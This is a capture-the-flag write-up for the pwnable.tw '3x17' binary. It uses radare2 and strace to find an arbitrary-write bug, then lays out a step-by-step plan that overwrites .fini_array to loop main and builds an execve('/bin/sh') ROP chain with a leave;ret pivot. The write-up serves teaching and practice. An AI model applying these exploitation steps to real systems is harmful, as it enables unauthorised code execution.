# Writeup

## Challenge description

The goal is to get the flag pwning the binary that is running on server.
This challenge is worth 150 points.
The challenge is reachble to: nc chall.pwnable.tw 10105.

## Binary Description

As usual extracts the binary information:

´
[0x00401c0e]> iI
arch     x86
baddr    0x400000
binsz    759016
bintype  elf
bits     64
***canary   false***
class    ELF64
compiler GCC: (Ubuntu 8.2.0-7ubuntu1) 8.2.0
crypto   false
endian   little
havecode true
laddr    0x0
lang     c
linenum  false
lsyms    false
machine  AMD x86-64 architecture
maxopsz  16
minopsz  1
***nx       true***
os       linux
pcalign  0
pic      false
relocs   false
rpath    NONE
sanitiz  false
static   true
stripped true
subsys   linux
va       true
`

So the stack is not executable and the canary is not enabled.
This leads to think that the vulnerability here could not be just a stack overflow.

### Binary system call map

Let's run the binary with `strace ./3x17` to understand how it works at syscall-level.

`
▶ strace ./3x17
execve("./3x17", ["./3x17"], 0x7ffcce4b4520 /\* 37 vars \*/) = 0
brk(NULL)                               = 0x1087000
brk(0x10881c0)                          = 0x10881c0
arch\_prctl(ARCH\_SET\_FS, 0x1087880)      = 0
uname({sysname="Linux", nodename="mcamp-VirtualBox", ...}) = 0
readlink("/proc/self/exe", "/home/mcamp/Desktop/CTFS/pwnable"..., 4096) = 53
brk(0x10a91c0)                          = 0x10a91c0
brk(0x10aa000)                          = 0x10aa000
access("/etc/ld.so.nohwcap", F\_OK)      = -1 ENOENT (No such file or directory)
write(1, "addr:", 5addr:)                    = 5
read(0, Hello World
"Hello World\n", 24)            = 12
write(1, "data:", 5data:)                    = 5
read(0, Hello world
NULL, 24)                       = -1 EFAULT (Bad address)
exiti\_group(0)                           = ?
+++ exited with 0 +++

mcamp@mcamp-VirtualBox:CTFS/pwnable.tw/3x17-150-pts  main ✗
12d20h ◒  
▶ Hello world
zsh: command not found: Hello
`

What the program does:

1. `write(1, "addr:", 5)`
2. `read(0, buffer, 24)`
3. `write(1, "data:", 5)`
4. `read(0, NULL, 24)`

So the first step seems suggest that the program expects an address in input.
The last step is the most ambiguous, since it is a read() and the buffer is NULL.
The last read() leads to execute string inserted `Hello world` on the shell.

What if the challenge on the server is run through a standard shell and the shell uses the pseudo terminal?
Yes, could be possible to execute shell commands and redirect the output to a server.

Seems to easy, but let's try it:

`
mcamp@mcamp-VirtualBox:~
⍉
▶ echo "ls -la" | nc chall.pwnable.tw 10105
addr:data:
`

Nope, nothing happens...it would have been nice.

Anyway now, let's dig into the code.

### How it works

As usual, let's dump all the functions using `radare2`.

`
[0x00401c0e]> afl | wc -l
464
[0x00401c0e]> afl | grep main
0x00401b6d    6 224          main
`

Ok it is quite big, but we got a `main`.
Let's analyze it.

`
[0x00401c0e]> pddo @ main
                   | /* r2dec pseudo code output */
                   | /* /home/mcamp/Desktop/CTFS/pwnable.tw/3x17-150-pts/3x17 @ 0x401b6d */
                   | #include <stdint.h>
                   |  
    0x00401b6d     | int32_t main (void) {
                   |     int64_t var_28h;
                   |     int64_t var_20h;
                   |     int64_t var_8h;
    0x00401b75     |     rax = *(fs:0x28);
    0x00401b7e     |     var_8h = *(fs:0x28);
    0x00401b82     |     eax = 0;
    0x00401b84     |     eax = *(0x004b9330);
    0x00401b8b     |     eax++;
    0x00401b8e     |     *(0x004b9330) = al;
    0x00401b94     |     eax = *(0x004b9330);
    0x00401b9d     |     if (al == 1) {
    0x00401ba3     |         var_28h = 0;
    0x00401bbc     |         eax = 0;
    0x00401bc1     |         ***fcn_00446ec0 (1, "addr:", 5);***
    0x00401bc6     |         rax = &var_20h;
    0x00401bd2     |         edi = 0;
    0x00401bd7     |         eax = 0;
    0x00401bdc     |         ***fcn_00446e20 (edi, rax, 0x18);***
    0x00401be1     |         rax = &var_20h;
    0x00401be5     |         rdi = rax;
    0x00401be8     |         eax = 0;
    0x00401bed     |         rax = fcn_0040ee70 ();
    0x00401bf2     |         rax = (int64_t) eax;
    0x00401bf4     |         var_28h = rax;
    0x00401c09     |         eax = 0;
    0x00401c0e     |         ***fcn_00446ec0 (1, "data:", 5);***
    0x00401c13     |         rax = var_28h;
    0x00401c1f     |         edi = 0;
    0x00401c24     |         eax = 0;
    0x00401c29     |         ***fcn_00446e20 (edi, rax, 0x18);***
    0x00401c2e     |         eax = 0;
    0x00401c35     |     } else {
    0x00401c36     |     }
    0x00401c37     |     rcx = var_8h;
    0x00401c3b     |     rcx ^= *(fs:0x28);
    0x00401c44     |     if (al != 1) {
    0x00401c46     |         fcn_0044a3e0 ();
    0x00401c46     |     }
    0x00401c4c     |     return rax;
                   | }
[0x00401c0e]> 
`
Comparing the main function to the strace done, seems that each function corresponds to a system call especially for
***fcn_00446ec0*** and ***fcn_00446e20***.

***fcn_0040ee70*** is an interesting function, it does not take any argument and returns a 32 bit value.
The value returned is then used into ***fcn_00446e20***.

Let's dig into each single function.

`
[0x00401c0e]> pddo @ fcn.00446ec0
                   | /* r2dec pseudo code output */
                   | /* /home/mcamp/Desktop/CTFS/pwnable.tw/3x17-150-pts/3x17 @ 0x446ec0 */
                   | #include <stdint.h>
                   |  
    0x00446ec0     | int64_t fcn_00446ec0 (int64_t arg1, int64_t arg2, int64_t arg3) {
                   |     int64_t var_8h;
                   |     cf = arg1;
                   |     rip = arg2;
                   |     spl = arg3;
    0x00446ec0     |     eax = *(0x004ba80c);
    0x00446ec8     |     if (eax == 0) {
    0x00446eca     |         eax = 1;
    0x00446ecf     |         rax = syscall_80h (rdi, rsi, rdx, r10, r8, r9);
    0x00446ed7     |         if (rax > 0xfffffffffffff000) {
    0x00446ed7     |             goto label_0;
    0x00446ed7     |         }
    0x00446ed9     |         return eax;
    0x00446ed9     |     }
    0x00446ee2     |     r12 = rdx;
    0x00446eea     |     ebx = edi;
    0x00446ef0     |     eax = fcn_0044a310 ();
    0x00446ef5     |     rdx = r12;
    0x00446ef8     |     rsi = rbp;
    0x00446efb     |     edi = ebx;
    0x00446efd     |     r8d = eax;
    0x00446f00     |     eax = 1;
    0x00446f05     |     rax = syscall_80h (rdi, rsi, rdx, r10, r8, r9);
    0x00446f0f     |     while (1) {
    0x00446f12     |         var_8h = rax;
    0x00446f17     |         fcn_0044a370 (r8d);
    0x00446f1c     |         rax = var_8h;
    0x00446f29     |         return rax;
                   | label_0:
    0x00446f30     |         rdx = 0xffffffffffffffc0;
    0x00446f37     |         eax = -eax;
    0x00446f39     |         *(fs:rdx) = eax;
    0x00446f3c     |         rax = 0xffffffffffffffff;
    0x00446f43     |         return rax;
    0x00446f44     |         rdx = 0xffffffffffffffc0;
    0x00446f4b     |         eax = -eax;
    0x00446f4d     |         *(fs:rdx) = eax;
    0x00446f50     |         rax = 0xffffffffffffffff;
    0x00446f57     |     }
                   | }
[0x00401c0e]> 
`

Since:

`
[0x00401c0e]> pxw @ 0x04ba80c
0x004ba80c  0x00000000 0x00000000 0x00000000 0x00000000  ................
`

The syscall is executed at address ***0x00446ecf*** with the arguments passed to this function and it is a `write()`.

`
[0x00401c0e]> pddo @  fcn.00446e20
                   | /* r2dec pseudo code output */
                   | /* /home/mcamp/Desktop/CTFS/pwnable.tw/3x17-150-pts/3x17 @ 0x446e20 */
                   | #include <stdint.h>
                   |  
    0x00446e20     | int64_t fcn_00446e20 (int64_t arg1, int64_t arg2, int64_t arg3) {
                   |     int64_t var_8h;
                   |     cf = arg1;
                   |     rip = arg2;
                   |     spl = arg3;
    0x00446e20     |     eax = *(0x004ba80c);
    0x00446e28     |     if (eax == 0) {
    0x00446e2a     |         eax = 0;
    0x00446e2c     |         rax = syscall_80h (rdi, rsi, rdx, r10, r8, r9);
    0x00446e34     |         if (rax > 0xfffffffffffff000) {
    0x00446e34     |             goto label_0;
    0x00446e34     |         }
    0x00446e36     |         return eax;
    0x00446e36     |     }
    0x00446e42     |     r12 = rdx;
    0x00446e4a     |     ebx = edi;
    0x00446e50     |     eax = fcn_0044a310 ();
    0x00446e55     |     rdx = r12;
    0x00446e58     |     rsi = rbp;
    0x00446e5b     |     edi = ebx;
    0x00446e5d     |     r8d = eax;
    0x00446e60     |     eax = 0;
    0x00446e62     |     rax = syscall_80h (rdi, rsi, rdx, r10, r8, r9);
    0x00446e6c     |     while (1) {
    0x00446e6f     |         var_8h = rax;
    0x00446e74     |         fcn_0044a370 (r8d);
    0x00446e79     |         rax = var_8h;
    0x00446e86     |         return rax;
                   | label_0:
    0x00446e90     |         rdx = 0xffffffffffffffc0;
    0x00446e97     |         eax = -eax;
    0x00446e99     |         *(fs:rdx) = eax;
    0x00446e9c     |         rax = 0xffffffffffffffff;
    0x00446ea3     |         return rax;
    0x00446ea4     |         rdx = 0xffffffffffffffc0;
    0x00446eab     |         eax = -eax;
    0x00446ead     |         *(fs:rdx) = eax;
    0x00446eb0     |         rax = 0xffffffffffffffff;
    0x00446eb7     |     }
                   | }
[0x00401c0e]> 
`

The syscall is executed at address ***0x00446e2c*** with the arguments passed to this function and it is a `write()`.

At this point let's dig into: ***fcn.0040ee70***:

`
[0x00401c0e]> pddo @ fcn.0040ee70
                   | /* r2dec pseudo code output */
                   | /* /home/mcamp/Desktop/CTFS/pwnable.tw/3x17-150-pts/3x17 @ 0x40ee70 */
                   | #include <stdint.h>
                   |  
    0x0040ee70     | void fcn_0040ee70 (void) {
    0x0040ee70     |     edx = 0xa;
    0x0040ee75     |     esi = 0;
    0x0040ee77     |     return void (*0x40fce0)() ();
                   | }
[0x00401c0e]> 
`

This function is just a wrapper for: ***0x40fce0***, let's dig into this.
The function is quite big:
`
[0x0040ee77]> pddo @ 0x40fce0 | wc -l
380
`

In this function there are a lot of branches, this makes hard to understand statically the code flow, it is required a debugging session.
Put a breakpoint to on ***0x0040fd7a*** let's see what happens here:

`
 0x0040fce0     | int64\_t fcn\_0040fce0 (int64\_t arg1, int64\_t arg2, uint32\_t arg3) {
                   |     cf = arg1;
                   |     rip = arg2;
                   |     spl = arg3;
    0x0040fce0     |     rax = 0xffffffffffffffa8;
    0x0040fce7     |     ecx = 0;
    0x0040fce9     |     r8 = *(fs:rax);
    0x0040fd34     |     r14d = 0;
    0x0040fd39     |     r13 = rdi;
    0x0040fd3e     |     r12d = 0;
    0x0040fd47     |     *((rsp + 8)) = rsi;
    0x0040fd4e     |     if (ecx != 0) {
    0x0040fd4e     |         goto label_14;
    0x0040fd4e     |     }
                   | label_8:
    0x0040fd57     |     if (edx == 1) {
    0x0040fd57     |         goto label_15;
    0x0040fd57     |     }
    0x0040fd60     |     if (edx > 0x24) {
    0x0040fd60     |         goto label_15;
    0x0040fd60     |     }
    0x0040fd66     |     rax = *(r13);
    0x0040fd6b     |     rcx = *((r8 + 0x68));
    0x0040fd6f     |     rbx = r13;
    0x0040fd72     |     rsi = rax;
    0x0040fd7a     |     if ((*((rcx + rax*2 + 1)) & 0x20) == 0) {
    0x0040fd7a     |         goto label_16;
    0x0040fd7a     |     }
                   |     do {
    0x0040fd80     |         rbx++;
    0x0040fd84     |         rax = *(rbx);
    0x0040fd88     |         rsi = rax;
                   |     } while ((*((rcx + rax*2 + 1)) & 0x20) != 0);
`

On ***0x0040fd7a*** `rbx = buf\_inserted\_stack`, `rax = buf\_inserted\_stack[0]` and `rcx = 0x00496040` so the compare is true if and only if `rcx[rax\*2 +1] == 0`
If the check fails a loop over the buffer inserted is executed with the same logic.

*** NOTE ***
The `while ((*((rcx + rax*2 + 1)) & 0x20) != 0);` could theorically go out of memory.

This comparison is in under our control, but let's see what happens then...

`
    0x0040fd88     |         rsi = rax;
                   |     } while ((\*((rcx + rax\*2 + 1)) & 0x20) != 0);
                   | label_16:
    0x0040fd95     |     if (sil == 0) {
    0x0040fd95     |         goto label_17;
    0x0040fd95     |     }
    0x0040fd9f     |     if (sil == 0x2d) {
    0x0040fd9f     |         goto label_18;
    0x0040fd9f     |     }
    0x0040fda5     |     *((rsp + 0x14)) = 0;
    0x0040fdb1     |     if (sil == 0x2b) {
    0x0040fdb1     |         goto label_19;
    0x0040fdb1     |     }
                   | label_3:
    0x0040fdbb     |     if (sil == 0x30) {
    0x0040fdbb     |         goto label_20;
    0x0040fdbb     |     }
    0x0040fdc3     |     if (edx != 0) {
    0x0040fdc3     |         goto label_21;
    0x0040fdc3     |     }
                   | label_1:
    0x0040fdcc     |     if (r14 != 0) {
    0x0040fdcc     |         goto label_22;
    0x0040fdcc     |     }
`

*** NOTE ***
sil represents the lower 16 bits of rsi.

At this point in order to waste less time in debugging a weird code a fuzzing approach was used.
The fuzzing was based on the strace output.
The goal was to find which input leads the second read() as read(0, value != NULL, 0x18).

The fuzzer script is in `fuzzer.sh`.

Using the fuzzer that weird code was uncovered.

*** NOTE ***
The fuzzer will store in a file the input that leads to a read(0, value != NULL, 0x18).
This file could be used in debug mode with radare2 as standard input using `dor stdin=file.hex`.
Then putting a breakpoint on ***0x00401bf2*** it's possible to see the weird code processing results.

Basically each byte inserted on the first read() is interpreted as a digit, e.g. inserting `1\n` leads to have
`0x00401bf2 > rax = 1`. This means that a 4 bytes address could be issued on the step 2 and then on the step 4
it is used to store new data.

So through this behaviour it is possible to write data somewhere in the memory and this, of course, could be exploited.

Before searching a way to exploit, come back to the weird code to understand at least where is the algorithm's core.
Since each digit 0-9 is in ascii represented from 0x30 to 0x39, just thinks about an easy way to do this.
The most easy could be something similar to this:

`
b = byte inserted
result = 0
if b - 0x30 < 9
	b is a digit
else
	b is not a digit
`

The related code is here:

`
0x0040fe49     |         edi = rsi - 0x30;
0x0040fe50     |         if (dil > 9) {
0x0040fe55     |             if (rbp != 0) {
0x0040fe55     |                 goto label\_26;
0x0040fe55     |             }
0x0040fe5b     |             esi = (int32\_t) sil;
`

So now it is possible to find how the final `rax` is built starting from the single digit.


## Exploitation

Time to exploit. Now it's known the vulnerability, but not how to exploit it.

Basically It is possible to choose the address to write into and what write.
Naif thoughts: writing into the stack makes no sense since we do not have a memory leak and we do not have the executable stack.
So something like ret2libc could be used?
Unfortunately not since:

`
mcamp@mcamp-VirtualBox:CTFS/pwnable.tw/3x17-150-pts  main ✗ 12d22h ◒
▶ rabin2 -l 3x17
[Linked libraries]

0 library
`

Ok, maybe a ROP could help...
But it is needed to find where attach the ROP.

The ROP (Return Oriented Programming) is an exploiting technique that exploits the existent code to bypass the NX protection.
Chunks of the code (Gadgets) are chained together to create a code flow. The code flow is given by some initial conditions (registers value).
What if we can write into the stack but not executing it? Well, it's possible to write on the return function the address of a gadget and on the
`ret` instruction the gadget is executed. The gadget must be chained in some way, exploiting the jumps (JOP) or the ret (ROP).
Below an example:

`
gadget\_1 at 0x100  mov rsi, 10; ret
gadget\_2 at 0x376  mov rdi, 16; ret
gadget\_3 at 0x500  mov rdx, 20; ret


STACK Before writing into it:
0x32100: previous fram info
0x320F8: previous frame info
0x320F0: ret
0x320E8: first local variable.

STACK after writing into it:
0x32100: addr_of(gadget\_3)
0x320F8: addr_of(gadget\_2)
0x320F0: addr_of(gadget\_1)
0x320E8: first local variable.

On the ret the gadget\_1 is executed and on the gadget\_1's ret the gadget\_2 is executed and so on, chained together.


Back to the challenge, let's follow the code flow in order to find how to exploit the bug.
Let's see after the main function what happens.

Ops, below there is an interesting snippet called from `entry0` function after the `main` execution:

`
[0x0040295c]> pd 24 @ 0x00402960
            ; DATA XREF from entry0 @ 0x401a5f
            ;-- rdx:
            ;-- rip:
            0x00402960      55             push rbp
            0x00402961      488d0598170b.  lea rax, section..data.rel.ro ; 0x4b4100
            0x00402968      488d2d81170b.  lea rbp, section..fini_array ; 0x4b40f0
            0x0040296f      53             push rbx
            0x00402970      4829e8         sub rax, rbp
            0x00402973      4883ec08       sub rsp, 8
            0x00402977      48c1f803       sar rax, 3
        ┌─< 0x0040297b      7419           je 0x402996
        │   0x0040297d      488d58ff       lea rbx, [rax - 1]
        │   0x00402981      0f1f80000000.  nop dword [rax]
        │   ; CODE XREF from map.home_mcamp_Desktop_CTFS_pwnable.tw_3x17_150_pts_3x17.r_x @ +0x1994
       ┌──> 0x00402988      ff54dd00       *** call qword [rbp + rbx*8] ***
       ╎│   0x0040298c      4883eb01       sub rbx, 1
       ╎│   0x00402990      4883fbff       cmp rbx, 0xffffffffffffffff
       └──< 0x00402994      75f2           jne 0x402988
        │   ; CODE XREF from map.home_mcamp_Desktop_CTFS_pwnable.tw_3x17_150_pts_3x17.r_x @ +0x197b
        └─> 0x00402996      4883c408       add rsp, 8
            0x0040299a      5b             pop rbx
            0x0040299b      5d             pop rbp
        ┌─< 0x0040299c      e98bb90800     jmp section..fini
        │   0x004029a1      662e0f1f8400.  nop word cs:[rax + rax]
        │   0x004029ab      0f1f440000     nop dword [rax + rax]
`

At ***0x00402988*** a call to `rbp[rbx\*8]` and debugging seems that `rbp = 0x004b40f0 = section..fini\_array` and `rbx = 2`.
Uhm,`fini\_array` it is just an array containing destructors ( declared through atexit() or gcc builtins ).
The fini\_array should be writable, let see:

`
[0x0040295c]> iS
[Sections]

nth paddr          size vaddr         vsize perm name
―――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00000000      0x0 0x00000000      0x0 ---- 
1   0x00000200     0x20 0x00400200     0x20 -r-- .note.ABIi\_tag
2   0x00000220     0x24 0x00400220     0x24 -r-- .note.gnu.build\_id
3   0x00000248    0x228 0x00400248    0x228 -r-- .rela.plt
4   0x00001000     0x17 0x00401000     0x17 -r-x .init
5   0x00001018     0xb8 0x00401018     0xb8 -r-x .plt
6   0x000010d0  0x8b360 0x004010d0  0x8b360 -r-x .text
7   0x0008c430   0x1efa 0x0048c430   0x1efa -r-x libc\_freeres\_fn
8   0x0008e32c      0x9 0x0048e32c      0x9 -r-x .fini
9   0x0008f000  0x1937c 0x0048f000  0x1937c -r-- .rodata
10  0x000a837c      0x1 0x004a837c      0x1 -r-- .stapsdt.base
11  0x000a8380   0xa608 0x004a8380   0xa608 -r-- .eh\_frame
12  0x000b2988     0xa9 0x004b2988     0xa9 -r-- .gcc\_except\_table
13  0x000b30c0     0x20 0x004b40c0     0x20 -rw- .tdata
14  0x000b30e0      0x0 0x004b40e0     0x40 -rw- .tbss
15  0x000b30e0     0x10 0x004b40e0     0x10 -rw- .init\_array
16  0x000b30f0     0x10 0x004b40f0     0x10 -rw- .fini\_array
17  0x000b3100   0x2df4 0x004b4100   0x2df4 -rw- .data.rel.ro
18  0x000b5ef8     0xf0 0x004b6ef8     0xf0 -rw- .got
19  0x000b6000     0xd0 0x004b7000     0xd0 -rw- .got.plt
20  0x000b60e0   0x1af0 0x004b70e0   0x1af0 -rw- .data
21  0x000b7bd0     0x48 0x004b8bd0     0x48 -rw- libc\_subfreeres
22  0x000b7c20    0x6a8 0x004b8c20    0x6a8 -rw- libc\_IO\_vtables
23  0x000b82c8      0x8 0x004b92c8      0x8 -rw- libc\_atexit
24  0x000b82d0      0x0 0x004b92e0   0x1718 -rw- .bss
25  0x000b82d0      0x0 0x004ba9f8     0x28 -rw- libc\_freeres\_ptrs
26  0x000b82d0     0x23 0x00000000     0x23 ---- .comment
27  0x000b82f4   0x10c0 0x00000000   0x10c0 ---- .note.stapsdt
28  0x000b93b4    0x134 0x00000000    0x134 ---- .shstrtab
`
As expected the section is writable, so this could be the target!

The previous snippet can be resumed in the following way:

`
rbx = 1
rbp = 0x004b40f0
do other things
while rbx != 0
	call rbx[rbx*8]
	rbx--
end while
`

Since it's possible to write 24 bytes on the second read, we can control at least two calls
writing two different addresses. Unfortunately checking with [one\_gadget](https://github.com/david942j/one_gadget)
there is no `execve(bin/sh)` single gadget present in the binary, so it is required to build a full rop.

Of course writing into ***0x004b40f0*** the main() address should lead to execute another time to writing in arbitrary memory and
in this way more gadgets could be put in the fini\_array section.
So writing ***0x0000000000402960 + 0x0000000000401b6d*** leads to execute in a while loop the main() function, since
when `rbx == 1` the main is executed and when `rbx == 0` the first instruction on the snippet is executed and another loop starts.
Through this loop multiple gadgets could be loaded in fini\_array (until the writable memory is available).

Pseudo snippet from the exploit:
`
offset = 0
i = 0
addr = 0x004b40f0
main\_addr = 0x401b6d
loop\_addr = 0x402960

read("addr:")
write(addr+offset)
read("data:")
write(main\_addr + loop\_addr)
offset += 16
while true:
	read("addr:")
	write(addr+offset)
	read("data:")
	write(gadget\_ddr[i] + gadget\_addr[i+1])
	offset += 16
	i++
`
Now the only problem is how to trigger the ROP execution, an idea could be to use the `LEAVE` assembly's instruction to
change the stack and increment the new stack pointer.

*** NOTE ***
LEAVE: is an instruction used to exit from a function, basically it is used to restore the previous stack frame.
Since when a function is called a new stack frame is created, when a function returns the stack frame must be destroyed.
The previous frame pointer is stored in the register ***rbp***.
The LEAVE instruction can be resumed as:
`
rsp = rbp;
pop rbp; // rbp = rsp[0]; rsp += 8
`


Fantastic a gadget that does a LEAVE basically set the stack to rbp+8 that points to our main and to trigger the ROP
is needed a `ret` instruction so a gadget like LEAVE + RET is used. This gadget will execute the jump to the ***0x004b40f0[16]***.
What if at ***0x004b40f0[16]*** there is the address of another gadget like `instr1;instr2;ret`?
Yes it is executed and on the its `ret` the core tries to call the address at ***0x004b40f0[24]*** and so on.
Theoretically a ROP chain is built.

*** NOTE ***
The LEAVE+RET gadget is the one that trigger the ROP so is the last one to insert in memory!

The exploit at this point is very clear:

1. Write Addr 0x004b40f0
2. Write Data = concat(0x402960,0x401b6d)
3. Write Addr 0x004b40f0 + 16
4. Write Gadget1 + Gadget2
5. Write Addr 0x004b40f0
6. Write LEAVE+RET gadget.

On the 6th step the gadget LEAVE+ret is executed and then the Gadget1 is executed and then the Gadget2.

Now It is time to find gadgets to execute a shell: `execve("/bin/sh", NULL, NULL)`.
Registers configuration:

`
rax = 59
rdi = addr\_of("/bin/sh")
rsi = 0
rdx = 0
`

On the step 4 instead writing two gadgets, it's better writing a gadget and a value. In this way the gadget needed are the ones like:
`pop \*; ret;` since there is a pop the stack goes forward to the next gadget and never calls the value we put!

So the pseudo exploit now is:

1. Write Addr 0x004b40f0
2. Write Data = concat(0x402960,0x401b6d)
3. Write Addr 0x004b40f0 + 16
4. Write Gadget1_POP_RAX + 0x3b
5. Write Addr 0x004b40f0 + 32
6. Write Gadget1_POP_RDX + 0x0
7. Write Addr 0x004b40f0 + 48
8. Write Gadget1_POP_RSI + 0x00
9. Write Addr 0x004b40f0 + 64
10. Write Gadget1_POP_RDI + (0x004b40f0 + 88)
11. Write Addr 0x004b40f0 + 80
12. Write Gadget1_SYSCALL + "/bin/sh"
13. Write Addr 0x004b40f0
14. Write LEAVE+RET gadget.

*** NOTE ***
It is important to notice that each gadget must end in a ret otherwise the next gadget is not executed!
Of course if a gadget uses a `pop` the next gadget in the table is at current+16, since a pop increment the stack
pointer and a ret too.

Now using radare2 or [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) it is possible to find this kind of gadgets to execute a shell!

